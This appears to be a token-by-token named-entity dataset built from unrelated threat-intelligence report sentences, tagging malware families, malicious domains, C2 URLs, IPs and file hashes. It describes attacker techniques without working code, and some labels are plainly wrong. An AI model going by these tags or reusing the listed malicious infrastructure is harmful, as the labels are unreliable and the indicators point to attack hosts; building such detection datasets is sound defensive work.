sent	O
.	O

In	O
2017	O
,	O
the	O
TeleBots	O
group	O
did	O
n't	O
stop	O
their	O
cyberattacks	O
;	O
in	O
fact	O
,	O
they	O
became	O
more	O
sophisticated	O
.	O

Once	O
victims	O
opened	O
the	O
lure	O
document	O
,	O
Word	O
will	O
firstly	O
visit	O
a	O
remote	O
website	O
of	O
IE	O
vbscript	O
0day	O
(	O
CVE-2018-8174	B-malware.unknown
)	O
to	O
trigger	O
the	O
exploit	O
.	O

Other	O
options	O
would	O
be	O
the	O
fixboot	O
command	O
from	O
the	O
Windows	O
Recovery	O
Console	O
found	O
on	O
a	O
Windows	O
OS	O
disk	O
.	O

In	O
this	O
new	O
version	O
,	O
the	O
malware	O
uses	O
POST	O
requests	O
with	O
the	O
following	O
pattern	O
:	O
As	O
the	O
malware	O
is	O
injected	O
into	O
every	O
process	O
of	O
the	O
infected	O
system	O
,	O
it	O
creates	O
named	O
pipe	O
in	O
order	O
to	O
handle	O
inter-processes	O
communication	O
.	O

Most	O
of	O
the	O
domains	O
registered	O
for	O
C	O
&	O
C	O
use	O
in	O
this	O
campaign	O
were	O
done	O
so	O
through	O
the	O
free	O
dynamic	O
DNS	O
Provider	O
ChangeIP.com	B-url.normal
.	O

By	O
Isaac	O
Palmer	O
April	O
22	O
,	O
2016	O
Introduction	O
Cylance	O
SPEARTM	O
has	O
identified	O
an	O
APT	O
group	O
which	O
deploys	O
multiple	O
customized	O
malware	O
implants	O
,	O
targeting	O
mainly	O
Chinese	O
and	O
Russian	O
users	O
.	O

Operation	B-malware.ransom
Manul	I-malware.ransom
is	O
not	O
particularly	O
sophisticated	O
,	O
but	O
it	O
is	O
well-understood	O
that	O
attacks	O
do	O
n't	O
need	O
to	O
be	O
sophisticated	O
in	O
order	O
to	O
be	O
effective	O
.	O

Table	O
2	O
shows	O
some	O
of	O
the	O
original	O
files	O
available	O
for	O
download	O
shown	O
with	O
their	O
MD5	O
hashes	O
.	O

Gibson	O
,	O
Owen	O
.	O

China	B-malware.backdoor
Chopper	I-malware.backdoor
is	O
so	O
small	O
and	O
simple	O
that	O
an	O
attacker	O
could	O
conceivably	O
type	O
the	O
contents	O
of	O
the	O
shell	O
by	O
hand	O
.	O

Who	O
is	O
responsible	O
?	O

This	O
discovery	O
motivated	O
researchers	O
to	O
search	O
for	O
other	O
command	O
&	O
control	O
servers	O
to	O
understand	O
how	O
widely	O
FinFisher	B-malware.backdoor
might	O
be	O
used	O
.	O

Other	O
malware	O
families	O
such	O
as	O
Ixeshe/Etumbot	B-malware.backdoor
,	O
which	O
are	O
known	O
to	O
be	O
used	O
by	O
Numbered	O
Panda	O
,	O
also	O
utilize	O
this	O
technique	O
.	O

Identical	O
data	O
collection	O
function	O
seen	O
in	O
both	O
older	O
and	O
newer	O
Nflog	B-malware.backdoor
variants	O

Because	O
vbscript.dll	O
imported	O
msvcrt.dll	O
,	O
the	O
msvcrt.dll	O
base	O
address	O
was	O
obtained	O
by	O
traversing	O
the	O
vbscript.dll	O
import	O
table	O
,	O
msvcrt.dll	O
introduces	O
kernelbase.dll	O
,	O
ntdll.dll	O
,	O
and	O
finally	O
the	O
NtContinue	O
,	O
VirtualProtect	O
function	O
address	O
was	O
obtained	O
.	O

user_id	O
is	O
a	O
hardcoded	O
value	O
in	O
the	O
malware	O
binary	O
that	O
is	O
sent	O
to	O
the	O
control	O
server	O
.	O

The	O
decoy	O
has	O
usually	O
been	O
a	O
PDF	O
document	O
but	O
Flash	O
videos	O
have	O
also	O
been	O
observed	O
in	O
some	O
cases	O
.	O

Notify	O
me	O
whe	O
n	O
ne	O
w	O
comme	O
nts	O
are	O
adde	O
d	O
.	O

Latin	O
America	O
Region	O
(	O
LAR	O
)	O
:	O
Brasil	O
,	O
México	O
North	O
America	O
Region	O
(	O
NABU	O
)	O
:	O
United	O
States	O
,	O
Canada	O
Europe	O
,	O
Middle	O
East	O
,	O
&	O
Africa	O
Region	O
(	O
EMEA	O
)	O
:	O
France	O
,	O
Deutschland	O
/	O
Österreich	O
/	O
Schweiz	O
,	O
Italia	O
,	O
Россия	O
,	O
España	O
,	O
United	O
Kingdom	O
/	O
Ireland	O
Privacy	O
Statement	O
Legal	O
Policies	O
Copyright	O
©	O
2018	O
Trend	O
Micro	O
Incorporated	O
.	O

Much	O
of	O
i.e.	O
kernel32.GetDefaultSystemLangID	O
,	O
kernel32.GetVersion	O
,	O
and	O
kernel32.GetSystemInfo	O
:	O
collected	O
with	O
set	O
of	O
same	O
calls	O
,	O
information	O
●	O
Default	O
system	O
codepage	O
●	O
Network	O
adapter	O
information	O
●	O
Processor	O
architecture	O
●	O
Hostname	O
and	O
IP	O
address	O
●	O
Windows	O
OS	O
and	O
Service	O
Pack	O
versions	O
Essentially	O
,	O
much	O
of	O
this	O
information-stealer	O
code	O
is	O
the	O
same	O
as	O
that	O
observed	O
in	O
previous	O
attacks	O
.	O

The	O
following	O
array	O
lists	O
the	O
modules	O
contained	O
in	O
this	O
Dino	B-malware.backdoor
binary	O
;	O
the	O
module	O
names	O
are	O
those	O
assigned	O
by	O
the	O
developers	O
.	O

Segment	O
networks	O
into	O
logical	O
enclaves	O
and	O
restrict	O
host-to-host	O
communication	O
paths	O
.	O

Previous	O
General	O
Dynamics	O
Fidelis	O
Cybersecurity	O
Services	O
(	O
Fidelis	O
)	O
reporting	O
,	O
ref	O
:	O
Fidelis	O
Threat	O
Advisory	O
(	O
FTA	O
)	O
#	O
1011	O
dated	O
15	O
Jan	O
2014	O
,	O
introduced	O
a	O
malware	O
system	O
comprised	O
of	O
multiple	O
files	O
that	O
provided	O
a	O
means	O
for	O
intruders	O
to	O
discover	O
and	O
retrieve	O
data	O
from	O
disparate	O
computer	O
systems	O
via	O
removable	O
storage	O
devices	O
.	O

Tags	O
:	O
ChessMaster	O
targeted	O
attacks	O

What	O
are	O
their	O
functions	O
?	O

Use	O
of	O
Newly	O
Created	O
'	O
Let	O
's	O
Encrypt	O
'	O
Certificate	O
:	O
A	O
certificate	O
observed	O
being	O
hosted	O
on	O
malicious	O
infrastructure	O
,	O
likely	O
used	O
for	O
some	O
aspect	O
of	O
a	O
malicious	O
campaign	O
,	O
is	O
a	O
newly	O
observed	O
certificate	O
(	O
Figure	O
12	O
)	O
from	O
a	O
free	O
provider	O
that	O
contains	O
a	O
hostname	O
mismatch	O
with	O
the	O
server	O
itself	O
.	O

Simultaneously	O
,	O
the	O
malicious	O
DLL	O
discards	O
all	O
calls	O
to	O
WriteDataBlockValue	O
and	O
instead	O
calls	O
WriteInputPoint	O
(	O
0x110	O
,	O
0	O
,	O
0x7763	O
)	O
and	O
WriteInputPoint	O
(	O
0x114	O
,	O
0	O
,	O
0x7763	O
)	O
every	O
millisecond	O
.	O

Both	O
the	O
THREEBYTE	B-malware.backdoor
and	O
HIGHTIDE	B-malware.backdoor
backdoors	O
were	O
used	O
in	O
attacks	O
targeting	O
organizations	O
in	O
Taiwan	O
.	O

We	O
'll	O
describe	O
how	O
the	O
attackers	O
operate	O
these	O
backdoors	O
,	O
provide	O
some	O
scripts	O
useful	O
to	O
further	O
investigate	O
the	O
campaign	O
as	O
well	O
as	O
meanings	O
to	O
detect	O
infections	O
or	O
scout	O
for	O
additional	O
samples	O
.	O

//	O
'	O
/c	O
'	O
$	O
bytes04	O
=	O
{	O
2f	O
00	O
63	O
00	O
}	O
//wcscmp	O
(	O
...	O
$	O
hex_string	O
=	O
{	O
b9	O
?	O
?	O

In	O
terms	O
of	O
defending	O
and	O
responding	O
to	O
malware	O
,	O
attribution	O
is	O
rarely	O
important	O
.	O

The	O
group	O
may	O
be	O
trying	O
new	O
tricks	O
to	O
disrupt	O
victims	O
and	O
delay	O
their	O
ability	O
to	O
respond	O
–	O
such	O
as	O
different	O
message	O
formats	O
,	O
and	O
the	O
deployment	O
of	O
ransomware	O
across	O
the	O
victim	O
's	O
network	O
as	O
a	O
smokescreen	O
for	O
their	O
other	O
activity	O
.	O

Network	O
Security	O
appliances	O
such	O
as	O
NGFW	O
,	O
NGIPS	O
,	O
and	O
Meraki	O
MX	O
can	O
detect	O
malicious	O
activity	O
associated	O
with	O
this	O
threat	O
.	O

Afterwards	O
,	O
the	O
persistence	O
file	O
will	O
be	O
created	O
in	O
/Library/LaunchDaemons/	O
or	O

The	O
program	O
copies	O
itself	O
as	O
<	O
Hangul	O
full	O
path	O
>	O
HncReporter.exe	O
and	O
changes	O
the	O
default	O
program	O
association	O
in	O
the	O
registry	O
to	O
open	O
HWP	O
documents	O
.	O

We	O
searched	O
for	O
additional	O
information	O
about	O
other	O
users	O
who	O
had	O
the	O
same	O
file	O
,	O
but	O
were	O
unable	O
to	O
find	O
anything	O
!	O

The	O
attacks	O
against	O
China	O
have	O
never	O
stopped	O
over	O
the	O
past	O
10	O
years	O
.	O

Washington	O
,	O
DC	O
.	O

Structure	O
returned	O
by	O
GetSystemInfo	O
API	O

In	O
this	O
analysis	O
,	O
we	O
'll	O
go	O
over	O
the	O
file	O
with	O
a	O
SHA256	O
hash	O
of	O
ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9	B-hash
.	O

As	O
shown	O
in	O
Figure	O
26	O
,	O
the	O
egrep	O
and	O
regex	O
commands	O
are	O
a	O
powerful	O
combination	O
.	O

Blue	O
hash	O
=	O
probable	O
IL	O
target	O
.	O

Previously	O
,	O
Raphael	O
worked	O
as	O
a	O
security	O
researcher	O
for	O
the	O
US	O
Air	O
Force	O
,	O
a	O
penetration	O
tester	O
,	O
and	O
he	O
even	O
invented	O
a	O
grammar	O
checker	O
that	O
was	O
sold	O
to	O
Automattic	O
.	O

Using	O
a	O
heuristic	O
approach	O
,	O
it	O
would	O
be	O
possible	O
to	O
detect	O
the	O
handshake	O
of	O
a	O
possible	O
Derusbi	B-malware.backdoor
server	O
variant	O
session	O
by	O
looking	O
for	O
the	O
following	O
pattern	O
:	O
Exactly	O
64	O
bytes	O
transmitted	O
First	O
8	O
bytes	O
taking	O
the	O
pattern	O
of	O
0x28	O
0x00	O
0x00	O
0x00	O
0x02	O
0x00	O
0x00	O
0x00	O

The	O
view.hta	O
contains	O
the	O
same	O
PowerShell-based	O
implant	O
and	O
establishes	O
a	O
remote	O
connection	O
over	O
SSL	O
to	O
hxxps://200.122.181.63:443/components/com_tags/views/news.php	B-url.unknown
.	O

Fig	O
4	O
.	O

positive	O

In	O
fact	O
,	O
even	O
the	O
house	O
numbers	O
changed	O
only	O
slightly	O
from	O
one	O
domain	O
to	O
the	O
other	O
.	O

The	O
internal	O
name	O
of	O
this	O
dll	O
is	O
{	O
7032F494-0562-4422-9C39-14230E095C52	O
}	O
.dll	O
but	O
we	O
've	O
seen	O
other	O
versions	O
like	O
{	O
5248F13C-85F0-42DF-860D-1723EEAA4F90	O
}	O
.dll	O
.	O

Besides	O
,	O
the	O
malware	O
is	O
able	O
to	O
get	O
the	O
phone	O
number	O
,	O
country	O
and	O
network	O
operator	O
name	O
from	O
cellular	O
towers	O
of	O
the	O
telecom	O
company	O
of	O
the	O
target	O
.	O

https://www.fidelissecurity.com/sites/default/files/FTA_1019_Ratcheting_Down_on_JSocket_A_PC_and_Android_Thre	O
at_FINAL.pdf	B-url.normal

If	O
it	O
is	O
executed	O
with	O
no	O
command-line	O
parameters	O
,	O
it	O
quits	O
.	O

Analysis	O
of	O
the	O
Main	O
ZxShell	B-malware.backdoor
Module	O

Besides	O
the	O
basic	O
library	O
(	O
KBDLV2.DLL	O
/	O
AUTO.DLL	O
)	O
that	O
is	O
responsible	O
for	O
common	O
communication	O
with	O
its	O
campaign	O
master	O
,	O
we	O
were	O
able	O
to	O
find	O
modules	O
performing	O
the	O
following	O
functions	O
:	O
Keystroke	O
logging	O
Directory	O
listing	O
collection	O
HWP	O
document	O
theft	O
Remote	O
control	O
download	O
and	O
execution	O
Remote	O
control	O
access	O
At	O
system	O
startup	O
,	O
the	O
basic	O
library	O
disables	O
the	O
system	O
firewall	O
and	O
any	O
AhnLab	O
firewall	O
(	O
a	O
South	O
Korean	O
security	O
product	O
vendor	O
)	O
by	O
zeroing	O
out	O
related	O
values	O
in	O
registry	O
:	O

In	O
a	O
similar	O
vein	O
with	O
past	O
CyberBerkut	O
activity	O
,	O
attackers	O
hid	O
behind	O
anonymous	O
activist	O
groups	O
like	O
'	O
anonpoland	O
'	O
,	O
and	O
data	O
from	O
victimized	O
organizations	O
were	O
similarly	O
leaked	O
and	O
'	O
weaponized	O
'	O
.	O

Analysis	O
indicates	O
the	O
log	O
file	O
is	O
probably	O
stored	O
in	O
the	O
clear	O
,	O
i.e.	O
,	O
the	O
contents	O
are	O
not	O
obfuscated	O
.	O

A	O
'	O
high	O
confidence	O
'	O
judgment	O
is	O
not	O
a	O
fact	O
or	O
a	O
certainty	O
,	O
however	O
,	O
and	O
such	O
judgments	O
still	O
carry	O
a	O
risk	O
of	O
being	O
wrong	O
.	O

cleaned.exe	O

Decoy	O
content	O
presented	O
in	O
malicious	O
archive	O
Figure	O
4	O
shows	O
the	O
controller	O
the	O
attacker	O
uses	O
to	O
interact	O
with	O
systems	O
compromised	O
with	O
XtremeRAT	B-malware.backdoor
.	O

As	O
no	O
concrete	O
attribution	O
has	O
yet	O
been	O
made	O
,	O
due	O
to	O
the	O
shared	O
interests	O
and	O
malware	O
features	O
of	O
both	O
2017	O
and	O
2018	O
campaigns	O
,	O
the	O
Gaza	O
Cybergang	O
may	O
be	O
a	O
good	O
starting	O
point	O
for	O
further	O
research	O
.	O

Visually	O
this	O
MBR	O
part	O
of	O
Diskcoder.C	O
looks	O
like	O
a	O
slightly	O
modified	O
version	O
of	O
Petya	B-malware.ransom
:	O
at	O
first	O
it	O
displays	O
a	O
message	O
that	O
impersonates	O
CHKDSK	O
,	O
Microsoft	O
's	O
disk	O
checking	O
utility	O
.	O

The	O
article	O
is	O
brief	O
,	O
but	O
states	O
that	O
'	O
This	O
is	O
–	O
by	O
far	O
–	O
the	O
most	O
serious	O
information	O
security	O
incident	O
we	O
have	O
seen	O
in	O
Poland	O
'	O
followed	O
by	O
a	O
claim	O
that	O
over	O
20	O
commercial	O
banks	O
had	O
been	O
confirmed	O
as	O
victims	O
.	O

chat-world.site	B-url.unknown
chat-messenger.site	B-url.unknown
gserv.mobi	B-url.unknown
arab-chat.site	B-url.unknown
onlineclub.info	B-url.unknown
free-apps.us	B-url.unknown
network-lab.info	B-url.unknown
kikstore.net	B-url.unknown

It	O
creates	O
a	O
mutex	O
'	O
HFRM_	O
'	O
to	O
ensure	O
there	O
is	O
only	O
one	O
running	O
copy	O
of	O
the	O
backdoor	O
.	O

Staff	O
Training	O
:	O
Have	O
we	O
trained	O
staff	O
on	O
cybersecurity	O
best	O
practices	O
?	O

If	O
the	O
type	O
of	O
the	O
object	O
that	O
the	O
system	O
is	O
trying	O
to	O
validate	O
is	O
a	O
process	O
,	O
the	O
hook	O
code	O
rewrites	O
again	O
the	O
configuration	O
data	O
of	O
the	O
ZxShell	B-malware.backdoor
service	O
in	O
the	O
windows	O
registry	O
.	O

The	O
hosting	O
company	O
is	O
not	O
a	O
known	O
bulletproof	O
hoster	O
based	O
on	O
the	O
BGP	O
Ranking	O
information.and	O
was	O
announced	O
by	O
two	O
other	O
ISPs	O
before	O
:	O

Similar	O
to	O
a	O
younger	O
sibling	O
looking	O
up	O
to	O
a	O
big	O
brother	O
,	O
regional	O
and	O
middle	O
powers	O
within	O
South	O
Asia	O
are	O
seeking	O
to	O
leverage	O
global	O
cyber	O
espionage	O
in	O
an	O
effort	O
to	O
achieve	O
parity	O
with	O
nation	O
states	O
who	O
have	O
far-reaching	O
diplomatic	O
power	O
,	O
modernized	O
militaries	O
and	O
influential	O
economies	O
.	O

It	O
did	O
not	O
leverage	O
the	O
underlying	O
TRITON	B-malware.infosteal
library	O
's	O
capability	O
for	O
Triconex	B-malware.unknown
device	O
discovery	O
,	O
instead	O
an	O
instance	O
of	O
trilog.exe	O
had	O
to	O
be	O
invoked	O
separately	O
for	O
each	O
target	O
controller	O
in	O
the	O
environment	O
.	O

In	O
the	O
end	O
,	O
it	O
releases	O
code	O
to	O
execute	O
after	O
constructing	O
an	O
object	O
.	O

Giấy	O
yêu	O
cầu	O
bồi	O
thường	O
mới	O
2016	O
-	O
Hằng.doc	O

©	O
2018	O
Accenture	O
.	O

We	O
have	O
strong	O
evidence	O
suggesting	O
the	O
group	O
using	O
CozyDuke	B-malware.drop
is	O
the	O
same	O
as	O
-	O
or	O
at	O
the	O
least	O
shares	O
command	O
and	O
control	O
infrastructure	O
with	O
-	O
the	O
group	O
or	O
groups	O
using	O
MiniDuke	O
and	O
OnionDuke	O
.	O

This	O
should	O
raise	O
red	O
flags	O
for	O
users	O
,	O
however	O
,	O
sometimes	O
temptation	O
trumps	O
security	O
.	O

~/Library/LaunchAgents/	O
folder	O
.	O

Specifically	O
,	O
we	O
identified	O
a	O
malicious	O
PHP	O
backdoor	O
that	O
was	O
deployed	O
under	O
medoc_online.php	O
in	O
one	O
of	O
the	O
FTP	O
directories	O
on	O
M.E.Doc	O
's	O
server	O
.	O

System	O
fingerprint	O

Compilation	O
Date	O

Policies	O
to	O
avoid	O
include	O
lack	O
of	O
password	O
expiration	O
date	O
,	O
lack	O
of	O
lockout	O
policy	O
,	O
low	O
or	O
disabled	O
password	O
complexity	O
requirements	O
,	O
and	O
password	O
history	O
set	O
to	O
zero	O
.	O

Detailed	O
analysis	O
of	O
Jokra	B-malware.unknown
can	O
be	O
found	O
here	O
.	O

Diskcoder.C	O
also	O
adopted	O
the	O
method	O
from	O
the	O
Win32/Filecoder.AESNI.C	O
(	O
aka	O
XData	O
)	O
ransomware	O
:	O
it	O
uses	O
a	O
lightweight	O
version	O
of	O
Mimikatz	O
to	O
obtain	O
credentials	O
and	O
then	O
executes	O
the	O
malware	O
using	O
SysInternals	O
'	O
PsExec	O
on	O
other	O
machines	O
on	O
the	O
LAN	O
.	O

Deep	O
Cluster	O
(	O
aka	O
Cluster	O
2	O
,	O
centred	O
on	O
news.foundationssl[.]com	B-url.unknown
)	O

5	O
Oct	O
.	O

>	O
>	O
16	O
)	O
+	O
(	O
&	O
0xffff	O
)	O
*	O
2	O

Commands	O
that	O
are	O
possibly	O
executed	O
are	O
listed	O
in	O
Table	O
1	O
.	O

winrm.exe	B-malware.infosteal
,	O
stisvc.exe	B-malware.infosteal
:	O

Talos	O
has	O
worked	O
closely	O
with	O
Apple	O
on	O
countering	O
this	O
threat	O
.	O

Upon	O
connection	O
to	O
the	O
C2	O
,	O
the	O
malware	O
sends	O
a	O
lot	O
of	O
information	O
about	O
the	O
target	O
including	O
:	O
Country	O
,	O
Malware	O
Path	O
,	O
Local	O
IP	O
Address	O
,	O
RAM	O
,	O
Android	O
Version	O
,	O
Device	O
Name	O
,	O
...	O
,	O
etc	O
.	O

User	O
interaction	O
is	O
required	O
in	O
order	O
to	O
execute	O
something	O
malicious	O
in	O
this	O
way	O
.	O

This	O
command	O
line	O
invokes	O
remote	O
Metasploit	O
stager	O
(	O
android.apk	O
)	O
and	O
drops	O
cpuminer	O
2.3.2	O
(	O
minerd.txt	O
)	O
built	O
for	O
ARM	O
processor	O
.	O

That	O
variant	O
contained	O
the	O
capability	O
to	O
search	O
for	O
hosts	O
related	O
to	O
the	O
SWIFT	O
network	O
and	O
the	O
same	O
control	O
server	O
strings	O
as	O
the	O
variant	O
we	O
found	O
targeting	O
the	O
Turkish	O
financial	O
sector	O
.	O

In	O
this	O
case	O
this	O
crafted	O
document	O
pretends	O
to	O
be	O
authored	O
by	O
someone	O
called	O
Amir	O
Kumar	O
Gupta	O
.	O

WHOIS	O
data	O
revealed	O
that	O
two	O
domains	O
used	O
were	O
registered	O
by	O
someone	O
from	O
Lebanon	O
,	O
whereas	O
others	O
were	O
registered	O
with	O
fictitious	O
registrant	O
data	O
.	O

These	O
DLLs	O
provide	O
additional	O
loading	O
and	O
other	O
anti-analysis	O
functionalities	O
.	O

PRB-Backdoor	B-malware.backdoor
is	O
a	O
backdoor	O
that	O
takes	O
its	O
name	O
from	O
the	O
function	O
used	O
in	O
the	O
final	O
PowerShell	O
script	O
payload	O
,	O
as	O
seen	O
in	O
the	O
figure	O
below	O
.	O

It	O
applies	O
to	O
all	O
processes	O
running	O
in	O
the	O
same	O
desktop	O
,	O
having	O
the	O
same	O
'	O
bitness	O
'	O
as	O
the	O
DLL	O
to	O
be	O
injected	O
.	O

21	O

Several	O
diplomats	O
and	O
employees	O
of	O
the	O
ministry	O
of	O
foreign	O
affairs	O
in	O
Egypt	O
(	O
20	O
emails	O
addresses	O
at	O
mfa.gov.eg	O
,	O
investment.gov.eg	O
and	O
other	O
offices	O
)	O
.	O

Thus	O
it	O
is	O
likely	O
the	O
code	O
comes	O
from	O
a	O
criminal	O
exploit	O
kit	O
which	O
is	O
being	O
leveraged	O
for	O
delivery	O
in	O
this	O
campaign	O
.	O

Scanning	O
disclosed	O
the	O
file	O
contained	O
a	O
function	O
possibly	O
associated	O
with	O
TEAN	O
encryption	O
.	O

2	O
.	O

An	O
extra	O
program	O
is	O
dedicated	O
exclusively	O
to	O
download	O
attachments	O
out	O
of	O
incoming	O
e-mails	O
with	O
a	O
particular	O
subject	O
tag	O
.	O

case	O
'	O
h	O
'	O
:	O

Specifically	O
,	O
our	O
key	O
conclusions	O
are	O
:	O

EvilGrab	B-malware.drop
possesses	O
a	O
full	O
range	O
of	O
capabilities	O
that	O
is	O
expected	O
in	O
malware	O
used	O
in	O
targeted	O
attacks	O
against	O
organizations	O
.	O

Instead	O
,	O
we	O
took	O
the	O
results	O
of	O
automated	O
code	O
comparisons	O
and	O
paired	O
them	O
down	O
to	O
a	O
signature	O
that	O
perfectly	O
fit	O
the	O
mould	O
of	O
both	O
in	O
the	O
hope	O
of	O
unearthing	O
similarities	O
.	O

Possible	O
Commands	O
Two	O
-­‐	O
Maximizing	O
Propagation	O
(	O
Theoretical	O
)	O
Command	O

If	O
you	O
follow	O
the	O
rabbit	O
hole	O
deep	O
enough	O
you	O
can	O
eventually	O
trace	O
samples	O
via	O
domain	O
and	O
IP	O
address	O
crossover	O
back	O
to	O
the	O
FBI	O
flash	O
#	O
A-000009-MW	O
from	O
mid	O
2013	O
.	O

Indeed	O
,	O
the	O
docx	O
format	O
is	O
,	O
in	O
fact	O
,	O
a	O
common	O
ZIP	O
archive	O
,	O
and	O
can	O
be	O
unzipped	O
using	O
common	O
tools	O
.	O

Figure	O
11	O
:	O

After	O
downloading	O
this	O
payload	O
,	O
it	O
would	O
check	O
the	O
running	O
environment	O
and	O
will	O
only	O
proceed	O
with	O
the	O
next	O
stage	O
when	O
it	O
determines	O
the	O
target	O
is	O
a	O
valid	O
one	O
for	O
its	O
purpose	O
.	O

Once	O
the	O
new	O
service	O
is	O
registered	O
,	O
the	O
payload	O
will	O
access	O
an	O
embedded	O
resource	O
that	O
is	O
encrypted	O
.	O

Exploitation	O
can	O
occur	O
via	O
a	O
maliciously	O
crafted	O
file	O
or	O
a	O
maliciously	O
crafted	O
web	O
page	O
and	O
allow	O
an	O
attacker	O
to	O
execute	O
arbitrary	O
code	O
.	O

After	O
unpacking	O
with	O
apktool	O
and	O
reading	O
(	O
AndroidManifest.xml	O
)	O
file	O
,	O
it	O
appears	O
that	O
the	O
application	O
is	O
a	O
malware	O
injected	O
inside	O
a	O
legitimate	O
application	O
having	O
java	O
package	O
name	O
:	O

System	O
Administrator	O
<	O
owner	O
's	O
name	O
>	O
's	O
iMac	O
x86_64	O
All	O
these	O
data	O
are	O
scrambled	O
and	O
encrypted	O
before	O
sending	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

Interestingly	O
,	O
when	O
a	O
developer	O
does	O
not	O
manually	O
specify	O
the	O
language	O
code	O
,	O
the	O
compiler	O
sets	O
it	O
to	O
the	O
language	O
of	O
the	O
developer	O
's	O
machine	O
.	O

At	O
startup	O
Dino	B-malware.backdoor
executes	O
successively	O
the	O
commands	O
stored	O
in	O
the	O
'	O
InitialCommands	O
'	O
field	O
in	O
its	O
configuration	O
;	O
in	O
the	O
sample	O
we	O
analyzed	O
they	O
are	O
:	O
sysinfo	O
cominfos	O
!	O
ipconfig	O
/all	O
!	O
ipconfig	O
/displaydns	O
!	O
tracert	O
www.google.com	B-url.normal

http://tools.cisco.com/security/center/viewThreatOutbreakAlert.x?alertId=30825	B-url.normal
7	O
.	O

A	O
wave	O
of	O
malicious	O
email	O
messages	O
has	O
been	O
sent	O
on	O
a	O
weekly	O
basis	O
to	O
hundreds	O
of	O
targets	O
.	O

Perform	O
Active	O
Directory	O
queries	O
.	O

Malware	O
masquerading	O
as	O
the	O
circumvention	O
tool	O
Freegate	B-malware.infosteal
.	O

This	O
type	O
of	O
vector	O
is	O
very	O
difficult	O
to	O
defend	O
against	O
since	O
users	O
can	O
often	O
be	O
tricked	O
into	O
acting	O
against	O
their	O
best	O
interests	O
.	O

Special	O
thanks	O
to	O
John	O
Scott-Railton	O
.	O

The	O
malware	O
then	O
creates	O
a	O
registry	O
value	O
for	O
the	O
the	O
dropped	O
file	O
(	O
Important.exe	O
)	O
,	O
this	O
ensures	O
that	O
malware	O
is	O
executed	O
every	O
time	O
the	O
system	O
restarts	O
.	O

Ch	O
2.11	O
:	O
162f415abad9708aa61db8e03bcf2f3c	B-hash
Ch	O
2.14.1	O
:	O
5121ce1f96d74076df1c39748e019f42	B-hash
Code	O
similarity	O
:	O
98	O
%	O
These	O
codes	O
are	O
really	O
similar	O
to	O
each	O
other	O
,	O
too	O
.	O

In	O
spring	O
2016	O
,	O
APT28	B-malware.backdoor
compromised	O
the	O
same	O
political	O
party	O
,	O
again	O
via	O
targeted	O
spearphishing	O
.	O

See	O
US-CERT	O
's	O
Tip	O
on	O
Website	O
Security	O
for	O
additional	O
information	O
.	O

The	O
malware	O
was	O
distributed	O
using	O
several	O
fake	O
Facebook	O
profiles	O
.	O

are	O
three	O
random	O
characters	O
)	O
.	O

In	O
a	O
PDB	O
found	O
in	O
a	O
sample	O
from	O
the	O
April	O
wave	O
,	O
there	O
is	O
an	O
indication	O
that	O
the	O
attacker	O
saw	O
that	O
wave	O
as	O
'	O
part	O
2	O
'	O
of	O
the	O
attacks	O
(	O
part	O
1	O
being	O
the	O
attacks	O
before	O
the	O
public	O
report	O
)	O
:	O
Name	O
D	O
:	O
\IL\Working	O
Tools\2016-04-23	O
NeD	O
Ver	O
9	O
Ran	O
Il	O
-	O
192.52.167.118\NeD	B-ip.unknown
Download	O
and	O
execute	O
Version	O
1	O
-	O
Doc\bin\Release\Obfuscated\News.pdb	O
https://www.nctc.gov/site/groups/hamas.html	B-url.normal

89b0f1a3a667e5cd43f5670e12dba411	O

These	O
addresses	O
tend	O
to	O
change	O
.	O

LuckyMouse	O
appears	O
to	O
have	O
been	O
very	O
active	O
recently	O
.	O

Clearsky	O
,	O
FireEye	O
,	O
Symantec	O
,	O
and	O
PhishLabs	O
have	O
all	O
performed	O
significant	O
research	O
on	O
Iranian	O
nation-state-sponsored	O
campaigns	O
that	O
provide	O
historical	O
insight	O
into	O
technical	O
capabilities	O
and	O
relationships	O
between	O
the	O
Iranian	O
government	O
and	O
contractors	O
.	O

AUG	O
9	O
AUG	O
11	O
SEP	O
12	O
SEP	O
13	O
SEP	O
15-30	O

Installer	O
:	O

Email	O
Subscription	O
Your	O
email	O
here	O

Five	O
of	O
the	O
six	O
file	O
droppers	O
(	O
bla.exe	B-malware.drop
,	O
update.exe	B-malware.drop
and	O
update.exe	B-malware.drop
)	O
all	O
share	O
the	O
same	O
PyInstaller	O
artifacts	O
listed	O
in	O
Table	B-malware.unknown
1	O
.	O

Targeted	O
senior	O
figures	O
managed	O
communications	O
and	O
media	O
affairs	O
,	O
policy	O
,	O
speech	O
writing	O
,	O
finance	O
,	O
and	O
travel	O
,	O
while	O
junior	O
figures	O
arranged	O
schedules	O
and	O
travel	O
for	O
Hillary	O
Clinton	O
's	O
campaign	O
trail	O
.	O

CVE­2012­0158	O

Microsoft	O
details	O
the	O
vulnerability	O
in	O
Security	O
Bulletin	O
MS10-002	O
.	O

The	O
embedded	O
malware	O
detection	O
engine	O
also	O
recognizes	O
the	O
variant	O
of	O
Shamoon	B-malware.unknown
malware	O
analyzed	O
.	O

Resolved	O
IPs	O
:	O

This	O
malware	O
operation	O
has	O
been	O
associated	O
with	O
intellectual	O
property	O
theft	O
including	O
source	O
code	O
and	O
technical	O
diagrams	O
(	O
CAD	O
,	O
oil	O
exploration	O
bid-data	O
,	O
etc	O
)	O
.	O

Internet	O
protocol	O
addresses	O

Figure	O
10	O
.	O

This	O
is	O
abusing	O
the	O
DDE	O
protocol	O
which	O
exists	O
within	O
Microsoft	O
Office	O
documents	O
.	O

File	O
Metadata	O

64f6f819a029956b8aeafb729512b460	B-hash
Server	O
Uranio	O

For	O
every	O
sample	O
,	O
it	O
is	O
possible	O
to	O
know	O
a	O
hash	B-hash
(	O
a	O
hexadecimal	O
unique	O
identi er	O
of	O
the	O
submitter	O
)	O
,	O
the	O
country	O
(	O
from	O
the	O
geolocalization	O
of	O
the	O
IP	O
address	O
of	O
the	O
submitter	O
)	O
and	O
the	O
method	O
(	O
the	O
way	O
the	O
sample	O
has	O
been	O
submitted	O
,	O
for	O
instance	O
via	O
the	O
web	O
interface	O
or	O
the	O
APIs	O
)	O
.	O

We	O
analyzed	O
a	O
new	O
RATANKBA	B-malware.backdoor
variant	O
(	O
BKDR_RATANKBA.ZAEL	O
–	O

The	O
latest	O
outbreak	O
was	O
directed	O
against	O
businesses	O
in	O
Ukraine	O
,	O
but	O
they	O
apparently	O
underestimated	O
the	O
malware	O
'	O
spreading	O
capabilities	O
.	O

The	O
payload	O
is	O
always	O
encrypted	O
with	O
a	O
